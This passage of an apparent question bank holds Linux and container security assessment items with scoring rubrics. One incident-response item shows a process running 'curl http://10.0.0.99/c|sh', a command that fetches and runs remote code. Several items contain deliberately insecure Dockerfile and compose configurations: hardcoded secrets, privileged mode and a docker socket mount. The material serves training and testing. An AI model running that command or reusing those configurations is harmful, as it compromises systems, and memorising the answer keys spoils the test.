Design the complete storage layout using LVM. Provide:
1. The partition/PV/VG/LV structure
2. The exact commands to create it
3. The mount points and fstab entries
4. Your rationale for each design decision
5. The snapshot-based backup procedure for the database`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "vg-separation",
        description: "Separates SSDs and HDDs into appropriate volume groups",
        points: 2,
        keywords: ["vgcreate", "volume group", "SSD", "HDD", "separate VG", "performance tier"],
        check: "Student creates separate VGs for SSDs (high-perf) and HDDs (capacity), or justifies combining them"
      },
      {
        id: "redundancy",
        description: "Implements disk redundancy (RAID or LVM mirror)",
        points: 2,
        keywords: ["mirror", "raid", "mdadm", "raid1", "--type mirror", "redundancy", "stripe"],
        check: "Student implements RAID1/mirror for critical data (database at minimum)"
      },
      {
        id: "lv-layout",
        description: "Creates logical volumes with appropriate sizes and isolation",
        points: 2,
        keywords: ["lvcreate", "root", "logs", "database", "uploads", "isolated", "separate LV"],
        check: "Student creates separate LVs for root, database, logs, and user data with justified sizing"
      },
      {
        id: "snapshot-procedure",
        description: "Describes LVM snapshot-based backup procedure",
        points: 2,
        keywords: ["lvcreate", "snapshot", "--snapshot", "consistent", "freeze", "pg_start_backup", "mount", "copy"],
        check: "Student describes: quiesce database -> create LVM snapshot -> mount snapshot -> copy data -> remove snapshot"
      },
      {
        id: "fstab-mount",
        description: "Provides correct fstab entries with appropriate mount options",
        points: 2,
        keywords: ["fstab", "noatime", "noexec", "nosuid", "UUID", "xfs", "ext4", "mount options"],
        check: "Student provides fstab entries with security-appropriate mount options (noexec on /tmp, nosuid on data volumes)"
      }
    ],
    gaps: [
      { if_missing: "vg-separation", gap: "lvm-volume-group-design" },
      { if_missing: "redundancy", gap: "lvm-mirror-raid-redundancy" },
      { if_missing: "lv-layout", gap: "lvm-logical-volume-sizing" },
      { if_missing: "snapshot-procedure", gap: "lvm-snapshot-backup-procedures" },
      { if_missing: "fstab-mount", gap: "fstab-security-mount-options" }
    ]
  }
},

// 13. auditd - design_solution - difficulty 5
{
  competencyId: "linux-admin",
  subTopic: "auditd-monitoring",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You are the security engineer for a financial services company. Design a comprehensive auditd configuration for a server processing credit card transactions. The server must comply with PCI-DSS requirements for:
- Monitoring all access to cardholder data (stored in /opt/payment/data/)
- Tracking all actions by privileged users
- Detecting unauthorized modification of system binaries and configuration
- Logging all authentication events
- Maintaining audit log integrity

Provide:
1. The complete audit.rules file
2. Explain each rule group and which PCI-DSS requirement it addresses
3. How you would ensure audit log integrity and prevent tampering
4. How you would handle log rotation without losing audit data
5. A sample aureport/ausearch command to investigate a specific incident scenario: "unauthorized file access in /opt/payment/data/ at 2am last Tuesday"`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "data-access-rules",
        description: "Creates comprehensive file watch rules for cardholder data",
        points: 2,
        keywords: ["-w", "/opt/payment/data", "-p", "rwa", "rwxa", "watch", "cardholder", "key", "-k"],
        check: "Student creates file watch rules on /opt/payment/data/ with read/write/attribute tracking and meaningful keys"
      },
      {
        id: "privileged-action-rules",
        description: "Monitors privileged user actions and escalation",
        points: 2,
        keywords: ["execve", "uid=0", "auid", "euid", "sudo", "su", "privileged", "syscall", "-a always,exit"],
        check: "Student creates syscall rules to track command execution by privileged users (uid/euid=0)"
      },
      {
        id: "integrity-monitoring",
        description: "Monitors system binary and configuration integrity",
        points: 2,
        keywords: ["/etc/", "/usr/bin", "/usr/sbin", "shadow", "passwd", "sudoers", "sshd_config", "modification"],
        check: "Student creates file integrity monitoring rules for critical system files and binaries"
      },
      {
        id: "log-integrity",
        description: "Addresses audit log integrity and tamper prevention",
        points: 2,
        keywords: ["immutable", "-e 2", "remote logging", "syslog", "append only", "chattr", "tamper", "integrity"],
        check: "Student addresses making rules immutable (-e 2), remote log shipping, and/or append-only attributes"
      },
      {
        id: "investigation-commands",
        description: "Provides correct ausearch/aureport commands for the incident scenario",
        points: 2,
        keywords: ["ausearch", "aureport", "-k", "-ts", "--start", "/opt/payment", "time", "Tuesday"],
        check: "Student provides working ausearch commands with correct time range and file path filters"
      }
    ],
    gaps: [
      { if_missing: "data-access-rules", gap: "auditd-file-watch-rules" },
      { if_missing: "privileged-action-rules", gap: "auditd-privileged-user-monitoring" },
      { if_missing: "integrity-monitoring", gap: "auditd-system-integrity-monitoring" },
      { if_missing: "log-integrity", gap: "audit-log-integrity-protection" },
      { if_missing: "investigation-commands", gap: "ausearch-aureport-investigation" }
    ]
  }
},

// 14. package management - compare_contrast - difficulty 4
{
  competencyId: "linux-admin",
  subTopic: "package-management-security",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `You manage a mixed fleet: RHEL 9 servers and Debian 12 servers. Compare the package management security models by analyzing these scenarios:

**Scenario A:** You need to deploy a security patch for OpenSSL across all servers within 4 hours of CVE publication.

**Scenario B:** A developer requests installing a third-party repository (EPEL on RHEL, a PPA on Debian) for a monitoring tool.

**Scenario C:** You discover a compromised package mirror was serving trojanized packages for 48 hours.

For each scenario, compare how you would handle it on RHEL (dnf/rpm) vs Debian (apt/dpkg):
1. What tools and procedures would you use?
2. What verification mechanisms exist to detect compromise?
3. What are the relative strengths and weaknesses of each ecosystem's approach?

Also explain: How do GPG signatures, repository metadata signing, and package pinning differ between the two systems?`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "patch-deployment",
        description: "Compares patch deployment workflows for both ecosystems",
        points: 2,
        keywords: ["dnf update", "apt upgrade", "yum", "security-only", "unattended-upgrades", "dnf-automatic", "CVE"],
        check: "Student compares security-targeted update commands and automation tools for both ecosystems"
      },
      {
        id: "third-party-repo-risks",
        description: "Analyzes third-party repo risks and mitigations on both platforms",
        points: 2,
        keywords: ["EPEL", "PPA", "GPG key", "priority", "pinning", "exclude", "module", "trust"],
        check: "Student discusses GPG key verification, package pinning/priorities, and trust implications for third-party repos"
      },
      {
        id: "compromise-detection",
        description: "Explains how to detect and respond to package compromise",
        points: 2,
        keywords: ["rpm -V", "debsums", "verify", "signature", "checksum", "sha256", "md5", "integrity"],
        check: "Student explains package verification tools (rpm -V, debsums) and GPG signature checking on both systems"
      },
      {
        id: "signing-comparison",
        description: "Accurately compares GPG signing and metadata verification models",
        points: 2,
        keywords: ["Release", "InRelease", "repomd.xml", "GPG", "detached signature", "inline", "SecureApt", "rpm --checksig"],
        check: "Student compares how RPM signs individual packages vs APT signs repository metadata (Release files)"
      },
      {
        id: "practical-recommendations",
        description: "Makes practical fleet management recommendations",
        points: 2,
        keywords: ["fleet", "automation", "policy", "Ansible", "satellite", "Spacewalk", "Foreman", "unattended"],
        check: "Student provides practical recommendations for managing patching across a mixed fleet"
      }
    ],
    gaps: [
      { if_missing: "patch-deployment", gap: "linux-security-patch-management" },
      { if_missing: "third-party-repo-risks", gap: "package-repository-trust-management" },
      { if_missing: "compromise-detection", gap: "package-integrity-verification" },
      { if_missing: "signing-comparison", gap: "package-signing-gpg-models" },
      { if_missing: "practical-recommendations", gap: "fleet-package-management-strategy" }
    ]
  }
},

// 15. process management - design_solution - difficulty 5
{
  competencyId: "linux-admin",
  subTopic: "process-management-forensics",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You receive an alert that a production server's CPU is at 100% and load average is climbing. When you SSH in, you observe:

\`\`\`bash
$ top -bn1 | head -20
top - 14:32:01 up 45 days, Tasks: 312 total, 8 running, 300 sleeping, 0 stopped, 4 zombie
%Cpu(s): 97.2 us, 1.8 sy, 0.0 ni, 0.5 id, 0.0 wa, 0.0 hi, 0.5 si, 0.0 st
MiB Mem :  15884.4 total,    234.1 free,  14892.3 used,    758.0 buff/cache
MiB Swap:   8192.0 total,   6543.2 free,   1648.8 used.    612.4 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
  18234 www-data  20   0  892340 543212   4320 R  45.2  3.3   0:15.23 apache2
  18235 www-data  20   0  892340 543180   4320 R  44.8  3.3   0:14.98 apache2
  18236 www-data  20   0  892340 543196   4320 R  43.9  3.3   0:14.87 apache2
    892 root      20   0   14232   4568   3200 S   2.1  0.0 312:45.67 /usr/sbin/irqbalance
   4521 mysql     20   0 8234560 12234880 12456 S   1.2 75.2 456:12.34 /usr/sbin/mysqld
  19001 root      20   0    2348   1024    756 S   0.8  0.0   0:00.01 sh -c curl http://10.0.0.99/c|sh
  19002 root      20   0   45672  12340   2340 R   0.3  0.1   0:00.01 /tmp/.cache/kworker

$ ls -la /proc/19001/exe
lrwxrwxrwx 1 root root 0 Jul 15 14:32 /proc/19001/exe -> /usr/bin/dash
$ ls -la /proc/19002/exe
lrwxrwxrwx 1 root root 0 Jul 15 14:32 /proc/19002/exe -> /tmp/.cache/kworker (deleted)
$ cat /proc/19002/cmdline
/tmp/.cache/kworker
\`\`\`

Design a complete incident response procedure for this scenario:
1. Immediate triage: what is happening and what are the priorities?
2. Evidence collection: what do you capture before taking action, and in what order?
3. Containment: how do you stop the damage without destroying evidence?
4. What do the zombie processes and memory/swap usage tell you?
5. Write the specific commands you would run at each stage`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "threat-identification",
        description: "Correctly identifies both the performance issue and the intrusion",
        points: 2,
        keywords: ["apache", "runaway", "malware", "kworker", "curl pipe sh", "C2", "compromise", "two separate issues"],
        check: "Student identifies two problems: (1) apache2 workers consuming CPU (possible DoS/abuse), (2) active compromise via curl-pipe-sh downloading and executing malware"
      },
      {
        id: "evidence-preservation",
        description: "Captures volatile evidence before containment",
        points: 2,
        keywords: ["/proc", "netstat", "ss", "lsof", "memory dump", "volatile", "process list", "network connections", "order of volatility"],
        check: "Student captures volatile data first: network connections, process trees, /proc entries, open files, memory, BEFORE killing processes"
      },
      {
        id: "forensic-commands",
        description: "Provides specific forensic commands",
        points: 2,
        keywords: ["ss -tlnp", "lsof -p", "/proc/19002/maps", "/proc/19002/fd", "strace", "pstree", "cp /proc/19002/exe"],
        check: "Student provides specific commands: process details from /proc, network connections, open file descriptors, and recovers the deleted binary from /proc"
      },
      {
        id: "containment-strategy",
        description: "Describes proper containment without evidence destruction",
        points: 2,
        keywords: ["isolate", "network", "iptables", "kill", "SIGSTOP", "firewall", "block", "preserve"],
        check: "Student describes: network isolation first (block C2 traffic), then SIGSTOP malware (preserves memory state), then systematic analysis"
      },
      {
        id: "system-health-analysis",
        description: "Analyzes zombies, memory pressure, and MySQL status",
        points: 2,
        keywords: ["zombie", "parent", "wait", "MySQL", "memory", "swap", "OOM", "buff/cache", "thrashing"],
        check: "Student analyzes: zombies indicate parent not reaping children, MySQL using 75% RAM causing swap pressure, and potential OOM risk"
      }
    ],
    gaps: [
      { if_missing: "threat-identification", gap: "linux-process-anomaly-detection" },
      { if_missing: "evidence-preservation", gap: "volatile-evidence-collection-order" },
      { if_missing: "forensic-commands", gap: "linux-process-forensics-proc-filesystem" },
      { if_missing: "containment-strategy", gap: "incident-containment-procedures" },
      { if_missing: "system-health-analysis", gap: "linux-memory-swap-performance-analysis" }
    ]
  }
},

// --- containers-infra (Containers & infrastructure) ---

// 1. Dockerfile best practices - spot_vuln - difficulty 2
{
  competencyId: "containers-infra",
  subTopic: "dockerfile-security",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `Review this Dockerfile for a Node.js API and identify all security and best-practice issues:

\`\`\`dockerfile
FROM node:18
LABEL maintainer="dev@company.com"

ENV NODE_ENV=production
ENV DB_PASSWORD=s3cretPassw0rd!
ENV API_KEY=sk-live-abc123def456

WORKDIR /app

COPY . .

RUN npm install
RUN apt-get update && apt-get install -y curl wget netcat vim
RUN chmod -R 777 /app

EXPOSE 3000
USER node

CMD ["node", "server.js"]
\`\`\`

Identify every security issue and bad practice. For each one, explain the risk and how to fix it.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "secrets-in-env",
        description: "Identifies hardcoded secrets in ENV directives",
        points: 2,
        keywords: ["DB_PASSWORD", "API_KEY", "secret", "ENV", "layer", "history", "build arg", "runtime", "docker secret"],
        check: "Student identifies secrets in ENV are baked into image layers and visible via docker history"
      },
      {
        id: "copy-before-install",
        description: "Identifies COPY . . before npm install breaks layer caching",
        points: 2,
        keywords: ["COPY", "package.json", "layer cache", "cache", "invalidate", "two-step", "package-lock"],
        check: "Student identifies COPY . . should be split: COPY package*.json first, then npm install, then COPY the rest"
      },
      {
        id: "unnecessary-packages",
        description: "Identifies unnecessary tools installed (attack surface)",
        points: 2,
        keywords: ["curl", "wget", "netcat", "vim", "attack surface", "unnecessary", "remove", "minimal"],
        check: "Student identifies that curl, wget, netcat, vim expand the attack surface and should not be in production images"
      },
      {
        id: "permission-issues",
        description: "Identifies chmod 777 and USER ordering issues",
        points: 2,
        keywords: ["777", "world-writable", "chmod", "USER", "before COPY", "chown", "permissions"],
        check: "Student identifies chmod 777 is overly permissive and USER node is set too late (after COPY and RUN as root)"
      },
      {
        id: "no-dockerignore",
        description: "Notes missing .dockerignore and no pinned base image",
        points: 2,
        keywords: [".dockerignore", "node_modules", ".git", ".env", "tag", "digest", "sha256", "pinned"],
        check: "Student mentions missing .dockerignore (copies node_modules, .git, .env) and/or unpinned base image tag"
      }
    ],
    gaps: [
      { if_missing: "secrets-in-env", gap: "container-secrets-management" },
      { if_missing: "copy-before-install", gap: "dockerfile-layer-caching-optimization" },
      { if_missing: "unnecessary-packages", gap: "container-attack-surface-reduction" },
      { if_missing: "permission-issues", gap: "dockerfile-user-permission-ordering" },
      { if_missing: "no-dockerignore", gap: "dockerfile-build-context-hygiene" }
    ]
  }
},

// 2. image layer caching - predict_output - difficulty 1
{
  competencyId: "containers-infra",
  subTopic: "image-layer-caching",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `Given this Dockerfile and the following sequence of builds, predict which layers are cached vs rebuilt for each build:

\`\`\`dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN python -m compileall .
EXPOSE 8000
CMD ["gunicorn", "app:create_app()"]
\`\`\`

**Build 1:** Initial build (no cache exists)
**Build 2:** Developer changes a line in \`app/views.py\` and rebuilds
**Build 3:** Developer adds \`flask-cors\` to \`requirements.txt\` and rebuilds

For each build, state which layers are built from cache and which are rebuilt. Explain why.`,
  rubric: {
    maxScore: 6,
    criteria: [
      {
        id: "build1-all-fresh",
        description: "Correctly states Build 1 has no cache",
        points: 1,
        keywords: ["no cache", "all layers", "fresh", "first build", "every layer"],
        check: "Student states all layers are built fresh for Build 1"
      },
      {
        id: "build2-copy-invalidates",
        description: "Correctly identifies COPY . . invalidates cache in Build 2",
        points: 2,
        keywords: ["COPY . .", "invalidate", "views.py", "changed file", "requirements.txt cached", "pip cached", "checksum"],
        check: "Student identifies: FROM/WORKDIR/COPY requirements/RUN pip are cached, but COPY . . is invalidated by the changed views.py, so COPY and compileall are rebuilt"
      },
      {
        id: "build3-requirements-invalidates",
        description: "Correctly identifies requirements.txt change cascades in Build 3",
        points: 2,
        keywords: ["requirements.txt", "COPY requirements", "cascade", "pip install", "all subsequent", "invalidated"],
        check: "Student identifies: FROM/WORKDIR are cached, but COPY requirements.txt is invalidated, causing pip install and ALL subsequent layers to rebuild"
      },
      {
        id: "cache-mechanism",
        description: "Explains the cache invalidation mechanism",
        points: 1,
        keywords: ["checksum", "hash", "file content", "changed", "invalidate", "subsequent", "cascade", "all after"],
        check: "Student explains that Docker compares file checksums for COPY and that cache invalidation cascades to all subsequent layers"
      }
    ],
    gaps: [
      { if_missing: "build2-copy-invalidates", gap: "docker-layer-cache-invalidation" },
      { if_missing: "build3-requirements-invalidates", gap: "docker-cache-cascade-behavior" },
      { if_missing: "cache-mechanism", gap: "docker-build-cache-mechanics" }
    ]
  }
},

// 3. bind mounts vs volumes - predict_output - difficulty 2
{
  competencyId: "containers-infra",
  subTopic: "bind-mounts-vs-volumes",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `Examine these Docker commands and predict what happens in each case:

\`\`\`bash
# Case 1: Named volume
docker volume create appdata
docker run -d --name app1 -v appdata:/data alpine sh -c "echo 'hello' > /data/test.txt && sleep 3600"
docker run -d --name app2 -v appdata:/data alpine sh -c "cat /data/test.txt && sleep 3600"
docker logs app2

# Case 2: Bind mount
docker run -d --name app3 -v /host/data:/data alpine sh -c "echo 'world' > /data/test.txt && sleep 3600"
ls -la /host/data/test.txt

# Case 3: Anonymous volume
docker run -d --name app4 -v /data alpine sh -c "echo 'temp' > /data/test.txt && sleep 3600"
docker rm -f app4
docker run -d --name app5 -v /data alpine sh -c "cat /data/test.txt && sleep 3600"
docker logs app5

# Case 4: Volume with Dockerfile
# Given Dockerfile: FROM alpine \n VOLUME /config \n COPY config.json /config/
docker build -t myapp .
docker run --name app6 myapp ls /config/
\`\`\`

For each case, predict the output and explain the data lifecycle.`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "named-volume-sharing",
        description: "Correctly predicts named volume is shared between containers",
        points: 2,
        keywords: ["hello", "shared", "named volume", "app2 sees", "same volume", "persistent"],
        check: "Student predicts app2 sees 'hello' because named volumes persist and can be shared between containers"
      },
      {
        id: "bind-mount-host",
        description: "Correctly predicts bind mount creates file on host",
        points: 2,
        keywords: ["host", "/host/data", "bind mount", "directly", "host filesystem", "world"],
        check: "Student predicts the file appears on the host at /host/data/test.txt with content 'world'"
      },
      {
        id: "anonymous-volume-loss",
        description: "Correctly predicts anonymous volume data is lost after rm",
        points: 2,
        keywords: ["anonymous", "lost", "new volume", "empty", "error", "not found", "different volume", "orphaned"],
        check: "Student predicts app5 gets a new empty anonymous volume (data from app4 is not available) -- file not found or empty"
      },
      {
        id: "volume-dockerfile-order",
        description: "Explains VOLUME directive interaction with COPY",
        points: 2,
        keywords: ["VOLUME", "COPY", "before", "after", "build time", "run time", "empty", "commit"],
        check: "Student explains that data COPYed after a VOLUME declaration may not persist as expected because VOLUME creates the mount point and subsequent writes during build are discarded"
      }
    ],
    gaps: [
      { if_missing: "named-volume-sharing", gap: "docker-named-volume-persistence" },
      { if_missing: "bind-mount-host", gap: "docker-bind-mount-mechanics" },
      { if_missing: "anonymous-volume-loss", gap: "docker-anonymous-volume-lifecycle" },
      { if_missing: "volume-dockerfile-order", gap: "dockerfile-volume-instruction-ordering" }
    ]
  }
},

// 4. container security capabilities - spot_vuln - difficulty 2
{
  competencyId: "containers-infra",
  subTopic: "container-security-capabilities",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `A developer submits this docker-compose.yml for a monitoring stack. Review it and identify all security issues:

\`\`\`yaml
version: "3.8"
services:
  prometheus:
    image: prom/prometheus
    ports:
      - "9090:9090"
    volumes:
      - /:/host:ro
      - prometheus-data:/prometheus
    privileged: true
    network_mode: host

  grafana:
    image: grafana/grafana
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana-data:/var/lib/grafana

  node-exporter:
    image: prom/node-exporter
    pid: "host"
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    cap_add:
      - ALL
    security_opt:
      - no-new-privileges:false

  cadvisor:
    image: gcr.io/cadvisor/cadvisor
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - /:/rootfs:ro
      - /var/run:/var/run
      - /sys:/sys:ro
    devices:
      - /dev/kmsg

volumes:
  prometheus-data:
  grafana-data:
\`\`\`

Identify every security issue, explain the risk, and provide the corrected configuration for each service.`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "privileged-mode",
        description: "Identifies privileged:true as critical risk",
        points: 2,
        keywords: ["privileged", "all capabilities", "host devices", "escape", "full access", "container escape"],
        check: "Student identifies privileged:true on prometheus gives full host access and is a container escape risk"
      },
      {
        id: "host-namespace",
        description: "Identifies dangerous host namespace sharing",
        points: 2,
        keywords: ["network_mode: host", "pid: host", "namespace", "isolation", "host network", "host PID"],
        check: "Student identifies network_mode:host and pid:host break network and process isolation respectively"
      },
      {
        id: "capabilities-escalation",
        description: "Identifies cap_add ALL and no-new-privileges:false",
        points: 2,
        keywords: ["cap_add", "ALL", "no-new-privileges", "false", "capabilities", "least privilege", "specific caps"],
        check: "Student identifies cap_add ALL grants all Linux capabilities and no-new-privileges:false allows privilege escalation"
      },
      {
        id: "docker-socket-default-creds",
        description: "Identifies docker socket mount and default Grafana password",
        points: 2,
        keywords: ["docker.sock", "socket", "root", "API", "admin", "default password", "grafana"],
        check: "Student identifies docker socket mount gives container-escape-equivalent access and default admin password on Grafana"
      }
    ],
    gaps: [
      { if_missing: "privileged-mode", gap: "docker-privileged-mode-risks" },
      { if_missing: "host-namespace", gap: "docker-namespace-isolation" },
      { if_missing: "capabilities-escalation", gap: "linux-capabilities-in-containers" },
      { if_missing: "docker-socket-default-creds", gap: "docker-socket-security-risks" }
    ]
  }
},

// 5. multi-stage builds - fix_code - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "multi-stage-builds",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This Dockerfile builds a Go application but has several issues with its multi-stage build. The resulting image is 1.2GB. Fix the Dockerfile to produce a minimal, secure image and explain each change:

\`\`\`dockerfile
FROM golang:1.21

WORKDIR /app
COPY . .
RUN go mod download
RUN CGO_ENABLED=0 go build -o /app/server ./cmd/server

FROM ubuntu:22.04
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*

COPY --from=0 /app/server /usr/local/bin/server
COPY --from=0 /app/config /etc/app/config
COPY --from=0 /app/.env /etc/app/.env

RUN useradd -r -s /bin/false appuser
USER appuser

EXPOSE 8080
HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:8080/health || exit 1

ENTRYPOINT ["/usr/local/bin/server"]
\`\`\`

Issues to address:
1. Image size optimization
2. Security concerns
3. Build efficiency
4. The health check has a problem in the final image
5. The .env file should not be in the image

Provide the corrected Dockerfile with explanations.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "minimal-base",
        description: "Uses scratch or distroless/alpine for the final stage",
        points: 2,
        keywords: ["scratch", "distroless", "alpine", "minimal", "base image", "no shell"],
        check: "Student replaces ubuntu:22.04 with scratch, distroless, or alpine to dramatically reduce image size"
      },
      {
        id: "build-stage-naming",
        description: "Names build stages and optimizes build layer order",
        points: 2,
        keywords: ["AS builder", "named stage", "COPY go.mod", "go.sum", "cache", "layer order"],
        check: "Student names the build stage (AS builder) and copies go.mod/go.sum before source for layer caching"
      },
      {
        id: "env-file-removed",
        description: "Removes .env from image, uses runtime secrets",
        points: 2,
        keywords: [".env", "secret", "runtime", "environment", "mount", "remove", "not in image"],
        check: "Student removes .env from the image and suggests passing config via environment variables or secrets at runtime"
      },
      {
        id: "healthcheck-fix",
        description: "Fixes healthcheck that relies on curl not present in minimal image",
        points: 2,
        keywords: ["curl", "not available", "scratch", "wget", "built-in", "/health", "binary"],
        check: "Student identifies curl is not in scratch/distroless and provides alternative (built-in health endpoint binary, wget in alpine, or removes HEALTHCHECK for orchestrator-level checks)"
      },
      {
        id: "security-hardening",
        description: "Adds additional build/runtime security measures",
        points: 2,
        keywords: ["non-root", "USER", "read-only", "ldflags", "strip", "-s -w", "numeric UID", "nobody"],
        check: "Student adds go build flags (-ldflags '-s -w'), uses numeric UID for non-root user, and/or sets read-only filesystem"
      }
    ],
    gaps: [
      { if_missing: "minimal-base", gap: "container-minimal-base-image-selection" },
      { if_missing: "build-stage-naming", gap: "multi-stage-build-cache-optimization" },
      { if_missing: "env-file-removed", gap: "container-secret-handling-at-build" },
      { if_missing: "healthcheck-fix", gap: "container-healthcheck-in-minimal-images" },
      { if_missing: "security-hardening", gap: "container-build-security-hardening" }
    ]
  }
},

// 6. docker-compose networking - trace_explain - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "docker-compose-networking",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Examine this docker-compose.yml and trace the network connectivity. For each pair of services listed below, determine if they can communicate and explain why:

\`\`\`yaml
version: "3.8"

services:
  frontend:
    image: nginx
    ports:
      - "80:80"
    networks:
      - frontend-net

  api:
    image: node:18-alpine
    expose:
      - "3000"
    networks:
      - frontend-net
      - backend-net

  worker:
    image: python:3.11-slim
    networks:
      - backend-net

  db:
    image: postgres:15
    expose:
      - "5432"
    networks:
      - backend-net

  cache:
    image: redis:7
    ports:
      - "127.0.0.1:6379:6379"
    networks:
      - backend-net

  monitoring:
    image: prom/prometheus
    ports:
      - "9090:9090"
    # no networks specified

networks:
  frontend-net:
    driver: bridge
  backend-net:
    driver: bridge
    internal: true
\`\`\`

Trace connectivity for:
1. frontend -> api (port 3000)
2. frontend -> db (port 5432)
3. api -> db (port 5432)
4. worker -> internet (e.g., pip install)
5. Host machine -> cache (port 6379)
6. monitoring -> api (port 3000)
7. External client -> cache (port 6379)`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "shared-network-access",
        description: "Correctly traces connectivity on shared networks",
        points: 2,
        keywords: ["frontend-net", "shared network", "DNS", "service name", "frontend -> api", "can reach"],
        check: "Student correctly states frontend->api works (shared frontend-net), frontend->db fails (different networks)"
      },
      {
        id: "internal-network",
        description: "Explains the internal:true network restriction",
        points: 2,
        keywords: ["internal", "no internet", "no egress", "isolated", "cannot reach", "external", "outbound"],
        check: "Student explains internal:true on backend-net blocks outbound internet access, so worker cannot pip install"
      },
      {
        id: "ports-vs-expose",
        description: "Distinguishes ports vs expose and host binding",
        points: 2,
        keywords: ["ports", "expose", "host", "127.0.0.1", "localhost only", "published", "external"],
        check: "Student explains: expose only makes port available to linked services (DNS), ports publishes to host; 127.0.0.1 binding restricts cache to localhost only"
      },
      {
        id: "default-network-monitoring",
        description: "Explains monitoring service uses the default network",
        points: 2,
        keywords: ["default", "default network", "monitoring", "cannot reach", "separate", "no networks"],
        check: "Student explains monitoring gets placed on the default network (projectname_default) and cannot reach services on explicitly defined networks"
      }
    ],
    gaps: [
      { if_missing: "shared-network-access", gap: "docker-compose-network-segmentation" },
      { if_missing: "internal-network", gap: "docker-internal-network-isolation" },
      { if_missing: "ports-vs-expose", gap: "docker-ports-vs-expose-binding" },
      { if_missing: "default-network-monitoring", gap: "docker-compose-default-network-behavior" }
    ]
  }
},

// 7. reverse proxy nginx - fix_code - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "reverse-proxy-nginx",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This nginx reverse proxy configuration for a containerized application has multiple issues. The setup uses docker-compose with nginx as a reverse proxy in front of an API and a frontend:

\`\`\`nginx
# nginx.conf
events {
    worker_connections 1024;
}

http {
    server {
        listen 80;
        server_name app.example.com;

        location / {
            proxy_pass http://frontend:3000;
        }

        location /api {
            proxy_pass http://api:8080;
            proxy_set_header Host $host;
        }

        location /static {
            alias /var/www/static;
            autoindex on;
        }

        location ~ /\\.ht {
            deny all;
        }
    }
}
\`\`\`

\`\`\`yaml
# docker-compose.yml
version: "3.8"
services:
  nginx:
    image: nginx:latest
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - static-files:/var/www/static

  frontend:
    image: myapp-frontend
    expose:
      - "3000"

  api:
    image: myapp-api
    expose:
      - "8080"

volumes:
  static-files:
\`\`\`

Fix both the nginx configuration and docker-compose.yml. Address:
1. Missing HTTPS/TLS
2. Security headers
3. Proxy header forwarding
4. The /api location trailing slash issue
5. Static file serving security
6. Any other security or performance issues`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "tls-setup",
        description: "Adds HTTPS with TLS configuration",
        points: 2,
        keywords: ["443", "ssl", "TLS", "certificate", "redirect", "HSTS", "ssl_certificate", "listen 443 ssl"],
        check: "Student adds HTTPS listener on 443 with TLS certificate configuration and HTTP->HTTPS redirect"
      },
      {
        id: "security-headers",
        description: "Adds essential security headers",
        points: 2,
        keywords: ["X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy", "X-XSS-Protection", "Strict-Transport-Security", "add_header"],
        check: "Student adds security headers: at minimum X-Frame-Options, X-Content-Type-Options, and HSTS"
      },
      {
        id: "proxy-headers",
        description: "Fixes proxy header forwarding for both locations",
        points: 2,
        keywords: ["X-Real-IP", "X-Forwarded-For", "X-Forwarded-Proto", "proxy_set_header", "remote_addr", "proxy_protocol"],
        check: "Student adds proper proxy headers: X-Real-IP, X-Forwarded-For, X-Forwarded-Proto to proxy locations"
      },
      {
        id: "trailing-slash",
        description: "Fixes the /api proxy_pass trailing slash issue",
        points: 2,
        keywords: ["trailing slash", "/api/", "proxy_pass", "path", "rewrite", "location /api/"],
        check: "Student explains the trailing slash behavior in proxy_pass and fixes it (adding/removing trailing slash changes path handling)"
      },
      {
        id: "autoindex-removal",
        description: "Removes autoindex and adds static file security",
        points: 2,
        keywords: ["autoindex", "off", "directory listing", "disable", "security", "static"],
        check: "Student removes autoindex on (directory listing is a security risk) and optionally adds caching headers for static files"
      }
    ],
    gaps: [
      { if_missing: "tls-setup", gap: "nginx-tls-configuration" },
      { if_missing: "security-headers", gap: "nginx-security-headers" },
      { if_missing: "proxy-headers", gap: "nginx-proxy-header-forwarding" },
      { if_missing: "trailing-slash", gap: "nginx-proxy-pass-path-handling" },
      { if_missing: "autoindex-removal", gap: "nginx-static-file-security" }
    ]
  }
},

// 8. Docker networking modes - trace_explain - difficulty 3
{
  competencyId: "containers-infra",
  subTopic: "docker-networking-modes",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A developer runs these Docker commands on a server with IP 192.168.1.100. Trace the network path for each container and explain what happens when a client at 192.168.1.50 tries to reach each service:

\`\`\`bash
# Container A: Bridge mode (default)
docker run -d --name web-bridge -p 8080:80 nginx

# Container B: Host mode
docker run -d --name web-host --network host nginx

# Container C: Custom bridge with specific subnet
